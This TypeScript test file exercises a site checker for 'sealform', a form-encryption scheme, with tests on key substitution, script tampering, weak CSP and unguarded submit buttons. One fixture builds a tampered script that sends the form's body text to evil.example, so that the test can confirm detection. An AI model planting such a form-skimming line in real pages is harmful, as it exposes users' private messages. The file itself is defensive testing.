import { describe, expect, it } from "vitest";
import { checkSite } from "../src/check.js";
import { generateKeyPair, type KeyPair } from "../src/core.js";
import { createHash } from "node:crypto";

const JS = "/*sealform*/console.log(1)";
const JS_HASH = "sha384-" + createHash("sha384").update(JS).digest("base64");

function site(kp: KeyPair | object, opts: { html?: string; js?: string; csp?: string | null } = {}) {
  const html = opts.html ?? `<!doctype html>
<script src="/sealform.js" integrity="${JS_HASH}" crossorigin="anonymous"></script>
<form method="post" action="/contact" data-sealform-key="/.well-known/sealform-key.json">
  <textarea name="body" data-seal></textarea>
  <button type="submit" disabled data-sealform-submit>送信</button>
</form>`;
  return (async (input: string | URL) => {
    const u = new URL(String(input));
    const headers: Record<string, string> = {};
    if (opts.csp !== null) headers["content-security-policy"] = opts.csp ?? "default-src 'self'";
    if (u.pathname === "/") return new Response(html, { headers });
    if (u.pathname === "/sealform.js") return new Response(opts.js ?? JS);
    if (u.pathname === "/.well-known/sealform-key.json") return new Response(JSON.stringify("publicDoc" in kp ? kp.publicDoc : kp));
    return new Response("", { status: 404 });
  }) as typeof fetch;
}

const levels = (fs: { id: string; level: string }[], id: string) => fs.filter((f) => f.id === id).map((f) => f.level);

describe("sealform check", () => {
  it("正しく設定されたページは問題なし", async () => {
    const kp = await generateKeyPair();
    const fs = await checkSite("https://example.org/", {
      fetch: site(kp), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH],
    });
    expect(fs.filter((f) => f.level !== "pass")).toEqual([]);
  });

  it("公開鍵が差し替えられたら検出する", async () => {
    const kp = await generateKeyPair();
    const attacker = await generateKeyPair();
    const fs = await checkSite("https://example.org/", {
      fetch: site(attacker), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH],
    });
    expect(levels(fs, "key")).toEqual(["fail"]);
    expect(fs.find((f) => f.id === "key")!.message).toContain("差し替え");
  });

  it("JS が書き換えられたら検出する（SRI ごと書き換えられても公式ハッシュと照合する）", async () => {
    const kp = await generateKeyPair();
    const evil = JS + ";fetch('https://evil.example/'+document.forms[0].body.value)";
    const evilHash = "sha384-" + createHash("sha384").update(evil).digest("base64");
    const html = `<script src="/sealform.js" integrity="${evilHash}"></script>
<form method="post" data-sealform-key="/.well-known/sealform-key.json"><button disabled data-sealform-submit></button></form>`;
    const fs = await checkSite("https://example.org/", {
      fetch: site(kp, { html, js: evil }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH],
    });
    expect(levels(fs, "sri")).toEqual(["pass"]);
    expect(levels(fs, "script")).toEqual(["fail"]);
  });

  it("sealform が外されたページを検出する", async () => {
    const kp = await generateKeyPair();
    const fs = await checkSite("https://example.org/", { fetch: site(kp, { html: `<form method="post"><textarea name="body"></textarea></form>` }) });
    expect(levels(fs, "form")).toEqual(["fail"]);
  });

  it("送信ボタンが最初から押せる・GET・HTTP・CSP 無しを指摘する", async () => {
    const kp = await generateKeyPair();
    const html = `<script src="/sealform.js"></script>
<form method="get" data-sealform-key="/.well-known/sealform-key.json"><button data-sealform-submit>送信</button></form>`;
    const fs = await checkSite("http://example.org/", { fetch: site(kp, { html, csp: null }) });
    expect(levels(fs, "https")).toEqual(["fail"]);
    expect(levels(fs, "form-method")).toEqual(["fail"]);
    expect(levels(fs, "submit-guard")).toEqual(["fail"]);
    expect(levels(fs, "csp")).toEqual(["warn"]);
    expect(levels(fs, "sri")).toEqual(["warn"]);
  });

  it("鍵の束に登録外の鍵が足されていたら検出する", async () => {
    const [a, b, evil] = await Promise.all([generateKeyPair(), generateKeyPair(), generateKeyPair()]);
    const set = { sealform: 1, type: "key-set", keys: [a.publicDoc, b.publicDoc, evil.publicDoc] };
    const fs = await checkSite("https://example.org/", {
      fetch: site(set), fingerprints: [a.publicDoc.fingerprint, b.publicDoc.fingerprint], knownScriptHashes: [JS_HASH],
    });
    expect(levels(fs, "key")).toEqual(["fail"]);
    expect(fs.find((f) => f.id === "key")!.message).toContain(evil.publicDoc.fingerprint);
  });

  it("鍵の更新で外した鍵が登録に残っていれば知らせ、期限が近い鍵も知らせる", async () => {
    const cur = await generateKeyPair({ validDays: 10, label: "相談員A" });
    const old = await generateKeyPair();
    const set = { sealform: 1, type: "key-set", keys: [cur.publicDoc] };
    const fs = await checkSite("https://example.org/", {
      fetch: site(set), fingerprints: [cur.publicDoc.fingerprint, old.publicDoc.fingerprint], knownScriptHashes: [JS_HASH],
    });
    expect(levels(fs, "key")).toEqual(["pass"]);
    expect(levels(fs, "key-missing")).toEqual(["warn"]);
    expect(fs.find((f) => f.id === "key-expiry")!.message).toContain("相談員A");
  });

  it("コメントの中に正しい HTML を残し、実際は平文フォームだけのページを見破る（レビューの指摘）", async () => {
    const kp = await generateKeyPair();
    const html = `<!--
<script src="/sealform.js" integrity="${JS_HASH}"></script>
<form method="post" action="/contact" data-sealform-key="/.well-known/sealform-key.json">
  <textarea name="body" data-seal></textarea><button disabled data-sealform-submit>送信</button>
</form>
-->
<form method="post" action="/contact"><textarea name="body"></textarea><button>送信</button></form>`;
    const fs = await checkSite("https://example.org/", {
      fetch: site(kp, { html }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH], formActions: ["/contact"],
    });
    expect(levels(fs, "form")).toEqual(["fail"]);
    expect(levels(fs, "watched-form")).toEqual(["fail"]);
    expect(levels(fs, "other-forms")).toEqual(["warn"]);
  });

  it("<template> や <noscript> の中の HTML も対象にしない", async () => {
    const kp = await generateKeyPair();
    const good = `<script src="/sealform.js" integrity="${JS_HASH}"></script><form method="post" action="/contact" data-sealform-key="/.well-known/sealform-key.json"><textarea name="body" data-seal></textarea><button disabled data-sealform-submit>送信</button></form>`;
    for (const wrap of [(h: string) => `<template>${h}</template>`, (h: string) => `<noscript>${h}</noscript>`]) {
      const fs = await checkSite("https://example.org/", { fetch: site(kp, { html: wrap(good) }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH] });
      expect(levels(fs, "form")).toEqual(["fail"]);
    }
  });

  it("script-src * などの広すぎる CSP は制限とみなさない", async () => {
    const kp = await generateKeyPair();
    for (const csp of ["script-src *", "default-src 'self'; script-src https:", "script-src 'self' 'unsafe-inline'", "script-src 'self' *.example.com"]) {
      const fs = await checkSite("https://example.org/", { fetch: site(kp, { csp }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH] });
      expect(levels(fs, "csp"), csp).toEqual(["warn"]);
    }
    const ok = await checkSite("https://example.org/", { fetch: site(kp, { csp: "script-src 'self'" }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH] });
    expect(levels(ok, "csp")).toEqual(["pass"]);
  });

  it("<meta> で指定した CSP も読む", async () => {
    const kp = await generateKeyPair();
    const html = `<meta http-equiv="Content-Security-Policy" content="script-src 'self'"><script src="/sealform.js" integrity="${JS_HASH}"></script>
<form method="post" action="/contact" data-sealform-key="/.well-known/sealform-key.json"><textarea name="body" data-seal></textarea><button disabled data-sealform-submit>送信</button></form>`;
    const fs = await checkSite("https://example.org/", { fetch: site(kp, { html, csp: null }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH] });
    expect(levels(fs, "csp")).toEqual(["pass"]);
  });

  it("保護の付いていない送信ボタンが別にあれば失敗にする（JS 無しで平文が送れるため）", async () => {
    const kp = await generateKeyPair();
    const html = `<script src="/sealform.js" integrity="${JS_HASH}"></script>
<form method="post" action="/contact" data-sealform-key="/.well-known/sealform-key.json"><textarea name="body" data-seal></textarea>
<button disabled data-sealform-submit>送信</button><input type="submit" value="こちらでも送信"></form>`;
    const fs = await checkSite("https://example.org/", { fetch: site(kp, { html }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH] });
    expect(levels(fs, "submit-guard")).toEqual(["fail"]);
  });

  it("登録した項目の data-seal が外されていたら検出する", async () => {
    const kp = await generateKeyPair();
    const html = `<script src="/sealform.js" integrity="${JS_HASH}"></script>
<form method="post" action="/contact" data-sealform-key="/.well-known/sealform-key.json"><input name="name" data-seal><textarea name="body"></textarea><button disabled data-sealform-submit>送信</button></form>`;
    const fs = await checkSite("https://example.org/", {
      fetch: site(kp, { html }), fingerprints: [kp.publicDoc.fingerprint], knownScriptHashes: [JS_HASH], sealedFields: ["name", "body"],
    });
    expect(fs.filter((f) => f.id === "watched-field").map((f) => [f.level, f.message.includes("body")])).toEqual([["pass", false], ["fail", true]]);
  });
});
